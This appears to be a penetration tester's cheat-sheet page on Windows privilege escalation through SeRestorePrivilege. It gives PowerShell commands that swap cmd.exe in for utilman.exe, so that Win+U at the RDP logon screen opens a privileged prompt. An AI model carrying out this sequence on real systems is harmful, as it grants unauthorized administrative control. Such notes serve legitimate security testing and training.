---
description: >-
  Write access control to any file on the system, regardless of the files ACL.
  You can modify services, DLL Hijacking, set debugger (Image File Execution
  Options)… A lot of options to escalate.
---

# SeRetorePrivilege

Check the info below. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)\
\
You will need to have a login terminal access via RDP or physically.&#x20;

{% code overflow="wrap" %}
```bash
# Windows Target

#https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1

PS> .\EnableSeRestorePrivilege.ps1
PS> move C:\Windows\system32\utilman.exe C:\Windows\system32\utilman.exe.o
PS> move C:\Windows\system32\cmd.exe C:\Windows\system32\utilman.exe

# Assume that you have a RDP console.
Kali> rdesktop $RHOST 

At Logon Screen: Press Win+u key 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>
